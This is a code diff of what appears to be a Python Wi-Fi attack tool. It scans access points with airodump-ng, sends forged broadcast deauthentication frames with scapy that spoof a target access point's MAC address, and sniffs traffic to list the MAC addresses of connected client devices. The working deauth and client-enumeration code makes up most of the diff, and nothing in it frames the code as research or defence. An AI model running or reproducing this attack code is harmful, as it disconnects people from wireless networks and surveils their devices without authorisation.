@@ -1,5 +1,5 @@
-from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
-from interface_func import monitor_mode, managed_mode
+from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff
+from interface_func import monitor_mode, managed_mode, set_channel
 import subprocess
 import time
 
@@ -17,7 +17,7 @@ def scan_access_points(interface):
                                            universal_newlines=True)
 
         # Wait for some time to capture access point data
-        time.sleep(20)
+        time.sleep(30)
 
         # Terminate airodump-ng process
         airodump_process.terminate()
@@ -55,68 +55,37 @@ def scan_access_points(interface):
 def deauth_attack(AP_MAC_address, channel, interface):
 
     # Change the channel of the wifi interface in monitor mode (needed for deauth attacks)
-    try:
-        subprocess.run(["sudo", "iw", "dev", interface + "mon", "set", "channel", channel])
-    except subprocess.CalledProcessError as e:
-        print("Error changing channels")
-
-    """
-    try:
-        print("Sending deauthentication frames to the AP: " + str(AP_MAC_address))
-        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", AP_MAC_address ,  interface + "mon" ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        time.sleep(5)
-        deauth_process.terminate()
-    except subprocess.CalledProcessError as e:
-        print("Error sending deauthentication frames:", e)
-        exit(1)
-
-    """
+    set_channel(interface, channel)
 
     frame = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=AP_MAC_address, addr3=AP_MAC_address) / Dot11Deauth(reason=7)
 
     sendp(frame,inter=0.1, count=50, iface=interface + "mon", verbose=1)
 
-
-
-
-# Function that monitors the traffic of a specific access point
+    
 def monitor(AP_MAC_address, interface):
 
+    ap_address = AP_MAC_address.lower()
     device_addr = []
-    try:
-        print("Monitoring")
-        airodump_process = subprocess.Popen(["sudo", "airodump-ng","--bssid",AP_MAC_address,"--output-format", "csv", "-w", "output", interface+"mon"],
-                                           stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE,
-                                           universal_newlines=True)
 
-        # Wait for some time to capture access point data
-        time.sleep(30)
-        
+    def packet_handler(packet):
+        if Dot11 in packet:
+            wifi_packet = packet[Dot11]
 
-        # Terminate airodump-ng process
-        airodump_process.terminate()
-
-        with open("output-01.csv", "r") as csvfile:
-            lines = csvfile.readlines()
-            for line in lines[5:]:  # Skip the header
-                parts = line.strip().split(',')
-                if(len(parts) > 1):
-                    device_addr.append(parts[0])
-
-
-    except subprocess.CalledProcessError as e:
-        print("Error scanning:", e)
-        exit(1)
-
-    try:
-        subprocess.run(["sudo", "rm", "output-01.csv"], check=True)
-    except subprocess.CalledProcessError as e:
-        print("Error deleting csv file")
-        exit(1)
-
-    return device_addr
+            boradcast_address = "ff:ff:ff:ff:ff:ff"
+            if(wifi_packet.addr1 != ap_address and wifi_packet.addr1 not in device_addr and wifi_packet.addr1 != boradcast_address):
+                device_addr.append(wifi_packet.addr1)
+            if(wifi_packet.addr2 != ap_address and wifi_packet.addr2 not in device_addr and wifi_packet.addr2 != boradcast_address):
+                device_addr.append(wifi_packet.addr2)
+            if(wifi_packet.addr3 != ap_address and wifi_packet.addr3 not in device_addr and wifi_packet.addr3 != boradcast_address):
+                device_addr.append(wifi_packet.addr3)
+            
     
+    capture_filter = f"wlan host {ap_address}"
+
+    sniff(iface=interface + "mon", filter=capture_filter, prn=packet_handler, timeout=30)
+    
+    return device_addr
+
 
 
 
@@ -135,5 +104,4 @@ def scan_devices(AP_MAC_address, channel, interface):
     return devices
 
 
-#devices = scan_devices("F4:06:8D:B7:75:F9", "6", interface)
-#print(devices)
+#print(scan_devices("F4:06:8D:B7:75:F9", "1", "wlp0s20f3"))
